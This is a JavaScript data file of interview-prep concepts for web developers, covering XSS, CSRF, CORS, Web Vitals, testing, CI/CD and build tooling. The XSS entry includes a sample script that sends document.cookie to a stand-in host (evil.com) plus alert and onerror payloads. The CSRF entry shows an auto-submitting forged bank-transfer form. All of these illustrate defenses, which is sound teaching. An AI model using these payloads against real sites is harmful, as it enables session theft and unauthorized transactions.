// Shared concepts (FE + BE both care)

export const CONCEPTS_COMMON = [
  {
    id: "c-xss",
    n: "XSS Prevention",
    cat: "Security",
    s: "Sanitize user input, use CSP headers, avoid innerHTML, escape output.",
    depth: "deep",
    detail: `## Cross-Site Scripting (XSS)

**Definition:** An attacker injects malicious client-side scripts into web pages viewed by other users. When the victim's browser loads the page, the attacker's script runs with the victim's privileges — can steal cookies, session tokens, keylog, or perform actions as the user.

![XSS attack flow](https://upload.wikimedia.org/wikipedia/commons/thumb/c/c5/XSS-attack-example.svg/800px-XSS-attack-example.svg.png)

## Three Types

### 1. Stored (Persistent) XSS
Malicious script saved on server (comment, profile bio, forum post), served to every viewer.
\`\`\`
// Victim posts this as their "display name":
<script>fetch('//evil.com?c='+document.cookie)</script>

// Every user who views victim's profile leaks cookies
\`\`\`

### 2. Reflected XSS
Script in URL/form, reflected in response without saving. Attacker sends victim a crafted link.
\`\`\`
// Vulnerable search page echoes query:
mysite.com/search?q=<script>alert(1)</script>

// Server renders: <p>You searched for: <script>alert(1)</script></p>
\`\`\`

### 3. DOM-based XSS
No server involvement — JS modifies DOM with untrusted data.
\`\`\`js
// Vulnerable
document.getElementById('greeting').innerHTML = location.hash.slice(1);

// URL: mysite.com/#<img src=x onerror=alert(1)>
\`\`\`

## Prevention

### Frontend
- **Escape output by default** — React uses \`{value}\` which escapes HTML
- **Never** \`dangerouslySetInnerHTML\` with user data
- Use **DOMPurify** when you must render HTML: \`DOMPurify.sanitize(html)\`
- Avoid \`eval\`, \`Function()\`, \`setTimeout(string)\`
- Avoid \`innerHTML\`, \`outerHTML\`, \`document.write\` — use \`textContent\`, \`createElement\`

### HTTP Headers
\`\`\`
Content-Security-Policy: default-src 'self'; script-src 'self' 'nonce-abc123'
X-Content-Type-Options: nosniff
\`\`\`
CSP blocks inline scripts + external domains. Huge defense even if XSS sneaks in.

### Cookies
\`\`\`
Set-Cookie: session=xyz; HttpOnly; Secure; SameSite=Strict
\`\`\`
**HttpOnly** prevents JavaScript from reading the cookie, so stolen cookies become harder.

## Context-Aware Escaping
Same string needs different escaping per context:
- HTML body: \`& < > " '\`
- HTML attribute: all non-alphanumeric
- JavaScript: \`\\ ' " < > & = -\`
- URL: percent-encoding
- CSS: escape chars outside \`[a-z0-9]\`

> Frameworks like React, Vue, Angular handle HTML escaping automatically. Risk areas are \`dangerouslySetInnerHTML\`, \`href={url}\` (check \`javascript:\` protocol), and injecting into \`<script>\` or \`<style>\` blocks.

## Interview Q: Is this safe?
\`\`\`jsx
<a href={userInput}>Click</a>
\`\`\`
**No.** User could submit \`javascript:stealCookie()\`. Always validate URL protocol before rendering: only allow \`http\`, \`https\`, \`mailto\`.`,
  },
  {
    id: "c-csrf",
    n: "CSRF Prevention",
    cat: "Security",
    s: "Token-based validation, SameSite cookies, custom headers for API calls.",
    depth: "deep",
    detail: `## Cross-Site Request Forgery (CSRF)

**Definition:** Attacker tricks an authenticated user into submitting a state-changing request to a trusted site without their knowledge — exploiting the browser's habit of attaching cookies automatically.

## How It Works
1. User logs into bank.com — browser stores \`session\` cookie
2. User (still logged in) visits evil.com, which contains:
   \`\`\`html
   <form action="https://bank.com/transfer" method="POST" id="f">
     <input name="to" value="attacker">
     <input name="amount" value="10000">
   </form>
   <script>document.getElementById('f').submit()</script>
   \`\`\`
3. Browser sends POST to bank.com WITH the session cookie attached — bank thinks it's legit

## Defenses

### 1. SameSite Cookie Attribute (simplest, modern default)
\`\`\`
Set-Cookie: session=xyz; SameSite=Lax
Set-Cookie: session=xyz; SameSite=Strict
\`\`\`
- **Strict** — cookie NEVER sent on cross-site requests (breaks OAuth redirects)
- **Lax** — sent on top-level navigation GETs only (not iframes, not POSTs)
- **None** — old behavior (cookie sent everywhere); requires \`Secure\`

Modern browsers default to \`Lax\` if attribute missing.

### 2. CSRF Tokens (synchronizer token pattern)
Server embeds random unguessable token in every form:
\`\`\`html
<form action="/transfer" method="POST">
  <input type="hidden" name="_csrf" value="a7f3c9e2...">
  ...
</form>
\`\`\`
Server validates token on submit. Attacker can't read it (same-origin policy).

### 3. Double-Submit Cookie
Cookie + matching value in request header/body. Attacker's page can't read the cookie, so can't fake the header.
\`\`\`
Cookie: csrf=abc123
X-CSRF-Token: abc123    <- must match
\`\`\`

### 4. Custom Request Header
Require \`X-Requested-With: XMLHttpRequest\`. Browsers block cross-site custom headers without CORS preflight.

### 5. Origin/Referer Check
\`\`\`
Origin: https://bank.com    <- only allow own origin
\`\`\`

## Key Insight
CSRF exploits **implicit authentication** (cookies). APIs using **explicit auth** (\`Authorization: Bearer <jwt>\` header) are immune — browsers don't auto-attach auth headers.

## Interview Quick-Check
| Auth Method | CSRF Vulnerable? |
| --- | --- |
| Cookie sessions | YES — need CSRF defense |
| JWT in localStorage + Auth header | NO (but XSS vulnerable) |
| JWT in HttpOnly cookie | YES — same as sessions |`,
  },
  {
    id: "c-cors",
    n: "CORS",
    cat: "Security/Networking",
    s: "Browser security: cross-origin requests need server Access-Control-Allow-* headers.",
    depth: "medium",
    detail: `## CORS (Cross-Origin Resource Sharing)

### Same-Origin Policy
Browsers restrict scripts from reading responses from different origins. An **origin** = scheme + host + port.
\`\`\`
https://app.com:443          <- origin A
https://api.app.com:443      <- different host → different origin
http://app.com:443           <- different scheme → different origin
\`\`\`

### CORS Relaxes This
Server sends headers allowing specific origins to bypass same-origin policy.

## Simple Requests
GET/HEAD/POST with safe headers and standard content-types. Browser sends request with \`Origin\` header:
\`\`\`
GET /data HTTP/1.1
Origin: https://app.com
\`\`\`
Server must respond with:
\`\`\`
Access-Control-Allow-Origin: https://app.com
\`\`\`

## Preflight (OPTIONS)
"Non-simple" requests (PUT, DELETE, JSON content-type, custom headers) trigger a preflight:
\`\`\`
OPTIONS /data HTTP/1.1
Origin: https://app.com
Access-Control-Request-Method: PUT
Access-Control-Request-Headers: Content-Type, Authorization
\`\`\`
Server must respond:
\`\`\`
Access-Control-Allow-Origin: https://app.com
Access-Control-Allow-Methods: GET, POST, PUT, DELETE
Access-Control-Allow-Headers: Content-Type, Authorization
Access-Control-Max-Age: 86400   <- cache preflight for 24h
\`\`\`

![CORS preflight flow](https://mdn.github.io/shared-assets/images/diagrams/http/cors/preflight-correct.svg)

## Credentials (Cookies on Cross-Origin)
\`\`\`js
fetch(url, { credentials: 'include' })
\`\`\`
Server must:
\`\`\`
Access-Control-Allow-Origin: https://app.com   <- specific origin, NOT *
Access-Control-Allow-Credentials: true
\`\`\`

## Common Pitfalls
- Wildcard \`*\` with \`Allow-Credentials: true\` — browsers reject this
- Forgetting OPTIONS handler in your server (especially Express/Flask)
- CDN caching preflight responses without \`Vary: Origin\`
- Frontend devs confused because "Postman works but browser doesn't" — Postman doesn't enforce CORS

## CORS Is NOT Security
CORS protects users from malicious sites reading cross-origin responses. It does NOT prevent requests from reaching your server. Attackers can still POST to you from anywhere — you still need CSRF protection, auth, rate limiting.

> **Mental model:** Same-origin policy = "don't let evil.com read my bank balance." CORS = "bank.com explicitly allows its sub-domain to read its own data."`,
  },
  {
    id: "c-web-vitals",
    n: "Core Web Vitals",
    cat: "Performance/Networking",
    s: "LCP, INP, CLS on FE; HTTP/1.1 vs 2 vs 3, TLS, QUIC on BE.",
    depth: "deep",
    detail: `## Core Web Vitals

Google's user-experience metrics, factored into search ranking since 2021.

## The Three Metrics

### 1. LCP — Largest Contentful Paint
Time until the largest visible element renders. Measures **loading speed**.
- **Good:** < 2.5s
- **Poor:** > 4s

Largest element is usually a hero image, headline, or video thumbnail.

**Optimize:**
- Preload hero assets: \`<link rel="preload" as="image" href="hero.jpg">\`
- Use \`<img fetchpriority="high">\` on the LCP candidate
- Server-side render critical HTML
- CDN + Brotli compression
- Proper cache headers
- Avoid render-blocking CSS/JS

### 2. INP — Interaction to Next Paint (replaced FID in 2024)
Response latency of the worst interaction during a session. Measures **responsiveness**.
- **Good:** < 200ms
- **Poor:** > 500ms

**Optimize:**
- Break long tasks with \`scheduler.yield()\` or \`setTimeout(fn, 0)\`
- Defer non-critical JS
- Use Web Workers for heavy computation
- Debounce expensive handlers
- Avoid layout thrashing (reads/writes batched)

### 3. CLS — Cumulative Layout Shift
Sum of unexpected layout shifts during page lifetime. Measures **visual stability**.
- **Good:** < 0.1
- **Poor:** > 0.25

**Optimize:**
- Always set \`width\` and \`height\` on images/videos
- Reserve space for ads/iframes before load
- Never insert content above existing content unless on user action
- Use \`font-display: optional\` or preload webfonts to avoid FOIT/FOUT shifts
- \`min-height\` for dynamic sections

## Measurement
- **Lab:** Lighthouse, WebPageTest (synthetic)
- **Field:** Chrome UX Report (CrUX), web-vitals npm library → your analytics

\`\`\`js
import { onLCP, onINP, onCLS } from 'web-vitals';
onLCP(v => sendToAnalytics({ name: 'LCP', value: v.value }));
onINP(v => sendToAnalytics({ name: 'INP', value: v.value }));
onCLS(v => sendToAnalytics({ name: 'CLS', value: v.value }));
\`\`\`

## HTTP Evolution (the "networking" half of this topic)

| Version | Transport | Multiplexing | HoL Blocking | Header Compression |
| --- | --- | --- | --- | --- |
| HTTP/1.1 | TCP | No (pipelining rarely works) | YES | No |
| HTTP/2 | TCP + TLS | Yes (streams) | At TCP layer | HPACK |
| HTTP/3 | **QUIC** (UDP) + TLS 1.3 | Yes (streams) | NO (per-stream loss) | QPACK |

**HTTP/2** eliminated the 6-connection-per-origin limit (streams share one TCP connection). But one packet loss blocked ALL streams (TCP HoL blocking).

**HTTP/3 (QUIC)** moves transport to UDP. Each stream has independent loss recovery. Also: 0-RTT resumption, connection migration across IP changes (mobile → WiFi).

## TLS Handshake
TLS 1.3 reduced it to 1 round-trip (TLS 1.2 was 2):
1. Client: ClientHello + supported ciphers + key share
2. Server: ServerHello + certificate + key share + Finished
3. Client: Finished — data flows

0-RTT allows session resumption with stored keys — data sent in first flight (risk: replay attacks for non-idempotent requests).`,
  },
  {
    id: "c-testing",
    n: "Testing Strategies",
    cat: "Testing",
    s: "Unit, Integration, E2E, Contract, Load. Same philosophy, different tools.",
    depth: "medium",
    detail: `## Testing Pyramid

\`\`\`
         /\\
        /E2E\\          few, slow, high confidence
       /------\\
      /Integr. \\       moderate count, moderate speed
     /----------\\
    /   Unit    \\      many, fast, isolated
   /--------------\\
\`\`\`

## Unit Tests
Test a single function/class/component in isolation. Dependencies mocked.
- **FE:** Jest + React Testing Library for components, Vitest for logic
- **BE:** JUnit (Java), pytest (Python), Go test, Jest (Node)

\`\`\`js
test('adds two numbers', () => {
  expect(add(2, 3)).toBe(5);
});

test('shows loading state', () => {
  render(<UserCard loading />);
  expect(screen.getByText(/loading/i)).toBeInTheDocument();
});
\`\`\`

## Integration Tests
Multiple units together, often with real dependencies (DB, network).
- FE: component + its child components + API mocks (MSW)
- BE: endpoint + service + real DB (test container)

## End-to-End (E2E)
Browser-driven full-stack tests.
- **Playwright** (recommended), Cypress, Selenium
- Slow, flaky — run in CI on main/pre-prod
- Cover critical user journeys: signup, checkout, key workflows

## Contract Tests
Verify consumer/provider API compatibility without full integration.
- Pact, Spring Cloud Contract
- Consumer writes expectations → provider verifies its responses match

## Load/Performance Tests
- k6, Gatling, JMeter, Locust
- Ramp up concurrent users, measure p50/p95/p99 latency, throughput, error rate
- Find breaking point, verify SLOs

## TDD vs BDD
- **TDD:** Red → Green → Refactor. Write failing test, make it pass, clean up
- **BDD:** Given/When/Then. Cucumber syntax. Business-facing

## Test Doubles
| Type | Purpose |
| --- | --- |
| **Dummy** | Passed but unused (fill parameter slot) |
| **Stub** | Returns canned responses |
| **Fake** | Working implementation, not production (in-memory DB) |
| **Mock** | Pre-programmed with expectations (verify calls) |
| **Spy** | Wraps real object, records calls |

## Key Testing Principles
1. **Isolate what you test** — one reason to fail per test
2. **Arrange-Act-Assert** (AAA) structure
3. **Test behavior, not implementation** — avoid testing internal state
4. **Deterministic** — no random data, fixed clocks, seeded IDs
5. **Fast unit tests** — if a unit test takes seconds, it's not a unit test
6. **Flaky tests are broken** — fix or delete, never "retry"

## Coverage Is a Trap
100% coverage ≠ bug-free. Prefer:
- Mutation testing (Stryker) — does test suite catch injected bugs?
- Property-based testing (fast-check, Hypothesis) — random inputs reveal edge cases`,
  },
  {
    id: "c-code-split-cicd",
    n: "Code Splitting & CI/CD",
    cat: "Performance/DevOps",
    s: "FE splits bundles; BE splits deploy stages with build → test → deploy pipelines.",
    depth: "medium",
    detail: `## Code Splitting (Frontend)

Ship less JS initially → faster LCP/INP. Load the rest on demand.

### Route-Based Splitting
Each page is a separate chunk:
\`\`\`js
const Dashboard = React.lazy(() => import('./pages/Dashboard'));

<Suspense fallback={<Spinner />}>
  <Dashboard />
</Suspense>
\`\`\`

### Component-Based
Heavy components (charts, rich editors):
\`\`\`js
const Editor = React.lazy(() => import('./RichEditor'));
\`\`\`

### Library Splitting
\`\`\`js
// webpack config
optimization: {
  splitChunks: {
    cacheGroups: {
      vendor: { test: /node_modules/, name: 'vendors' }
    }
  }
}
\`\`\`

### Tree Shaking
ES modules + static imports enable bundlers to drop unused exports.
\`\`\`js
// lodash-es: only used functions included
import { debounce } from 'lodash-es';
\`\`\`

### Preload vs Prefetch
- \`<link rel="preload">\` — needed now, high priority
- \`<link rel="prefetch">\` — needed later, idle-time

## CI/CD Pipelines (Backend)

\`\`\`
code push → Lint → Test → Build → Deploy staging → Smoke test → Deploy prod
\`\`\`

### Stages
1. **Lint/Format** — ESLint, Prettier, gofmt, black
2. **Unit tests** — fast, parallel
3. **Integration tests** — against test containers
4. **Build** — compile, containerize (\`docker build\`)
5. **Security scan** — Snyk, Trivy, OWASP dependency check
6. **Deploy to staging** — automated
7. **E2E tests** — run against staging
8. **Manual approval** (or auto-deploy)
9. **Deploy to prod**

### Deployment Strategies

**Blue-Green:** Two identical environments. Deploy to inactive, switch LB.
- Pros: Instant rollback | Cons: 2x infra

**Canary:** Route small % of traffic to new version, ramp up if healthy.
\`\`\`
  100% traffic
     |
  ───┼───────> v1.0  90%
     └───────> v1.1  10%    <- monitor error rate
\`\`\`

**Rolling:** Replace instances one at a time. Kubernetes default.

**Feature Flags:** Deploy code dark, toggle on for users. LaunchDarkly, Unleash.

### Tooling
- **GitHub Actions / GitLab CI / CircleCI** — pipeline orchestration
- **Docker** — reproducible builds
- **Kubernetes** — orchestration
- **ArgoCD** — GitOps (Git is source of truth for cluster state)
- **Jenkins** — veteran but still widespread

### Observability in CI/CD
- Pipeline metrics: success rate, p95 duration, flaky test detection
- Deployment markers in APM (Datadog, New Relic) for correlation
- Automatic rollback on SLI breach`,
  },
  {
    id: "c-webpack-vite-docker",
    n: "Webpack vs Vite / Docker",
    cat: "Tooling/DevOps",
    s: "Build tooling on FE; containerization on BE.",
    depth: "medium",
    detail: `## Webpack vs Vite (Frontend Build Tools)

### Webpack
Mature, configurable bundler. Bundles everything (including dev) then serves.

**Pros:**
- Huge plugin ecosystem (15 years old)
- Complete control via config
- Battle-tested at scale

**Cons:**
- Slow dev server on large projects — bundles everything upfront
- Complex config (webpack.config.js can hit 500 lines)

\`\`\`js
// webpack.config.js
module.exports = {
  entry: './src/index.js',
  output: { filename: 'bundle.js' },
  module: { rules: [{ test: /\\.jsx?$/, use: 'babel-loader' }] },
  plugins: [new HtmlWebpackPlugin()]
};
\`\`\`

### Vite
Modern, leverages native ESM in the browser during dev.

**Dev server:**
- Serves source files as ESM — browser requests modules lazily
- No bundling → instant cold start, instant HMR
- Uses esbuild (Go-based) for pre-bundling deps

**Production:**
- Uses Rollup for tree-shaken, optimized bundles

**Pros:**
- 10-100x faster dev startup
- Simpler config (vite.config.js often <50 lines)
- Sensible defaults

**Cons:**
- Newer ecosystem (smaller plugin count)
- Some legacy libs don't ship ESM cleanly

\`\`\`js
// vite.config.js
import react from '@vitejs/plugin-react';
export default { plugins: [react()] };
\`\`\`

### When to Choose
- Greenfield project → **Vite**
- Large existing Webpack config → incremental migration
- Need webpack-specific plugin → Webpack

## Docker & Containerization

### Why Containers?
- "Works on my machine" → gone. Image runs identically everywhere.
- Isolation: processes, filesystem, network
- Fast start (seconds vs VMs' minutes)

### Dockerfile Anatomy
\`\`\`dockerfile
# Multi-stage build for small image
FROM node:20-alpine AS builder
WORKDIR /app
COPY package*.json ./
RUN npm ci
COPY . .
RUN npm run build

FROM nginx:alpine
COPY --from=builder /app/dist /usr/share/nginx/html
EXPOSE 80
\`\`\`

### Key Concepts
- **Image** — template (layers of filesystem changes)
- **Container** — running instance of an image
- **Layer caching** — unchanged layers reused → fast rebuilds
- **Registry** — Docker Hub, ECR, GCR, ACR

### Best Practices
1. **Multi-stage builds** — build tools absent from final image
2. **Small base images** — \`alpine\`, \`distroless\`, \`scratch\`
3. **\`.dockerignore\`** — skip \`node_modules\`, \`.git\`
4. **Pin versions** — \`FROM node:20.11.0\` not \`node:latest\`
5. **Non-root user** — \`USER 1000\`
6. **Single process per container** — use orchestrator for multi-service
7. **Healthchecks** — \`HEALTHCHECK CMD curl -f http://localhost/ || exit 1\`

### Docker Compose (local dev)
\`\`\`yaml
services:
  app:
    build: .
    ports: ["3000:3000"]
  db:
    image: postgres:15
    environment: { POSTGRES_PASSWORD: dev }
    volumes: ["pgdata:/var/lib/postgresql/data"]
volumes: { pgdata: {} }
\`\`\`

### vs Kubernetes
Docker runs containers on one host. Kubernetes orchestrates containers across many hosts: scheduling, scaling, self-healing, rolling updates, service discovery.`,
  },
];
